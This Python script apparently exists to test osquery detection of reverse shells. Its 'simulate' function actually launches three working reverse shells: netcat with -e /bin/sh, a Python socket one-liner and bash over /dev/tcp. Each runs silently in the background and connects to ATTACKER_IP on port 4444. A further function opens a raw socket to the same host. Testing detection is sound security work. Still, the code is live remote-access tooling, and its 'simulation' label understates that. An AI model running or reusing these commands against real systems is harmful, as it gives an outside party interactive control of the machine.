import os
import time
import subprocess
import socket

# Attacker's IP and Port (Change if necessary)
ATTACKER_IP = "192.168.1.100"  # Replace with your listener IP
ATTACKER_PORT = 4444  # Replace with your listener port

def simulate_reverse_shell():
    print("[*] Simulating reverse shell connection...")

    # Method 1: Using netcat (nc)
    subprocess.Popen(f"nc {ATTACKER_IP} {ATTACKER_PORT} -e /bin/sh", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Method 2: Using Python reverse shell
    subprocess.Popen(f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Method 3: Using bash reverse shell
    subprocess.Popen(f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("[+] Reverse shell attempts executed!")

def create_fake_socket_connection():
    print("[*] Creating a fake outbound socket connection...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        sock.close()
        print("[+] Fake socket connection established.")
    except Exception as e:
        print(f"[-] Failed to create socket connection: {e}")

def main():
    print("[*] Simulating reverse shell behavior for osquery detection...")

    simulate_reverse_shell()
    create_fake_socket_connection()

    print("[*] Waiting for the query interval to pass...")
    time.sleep(10)

    print("[*] Simulation completed. Run your osquery query now.")

if __name__ == "__main__":
    main()
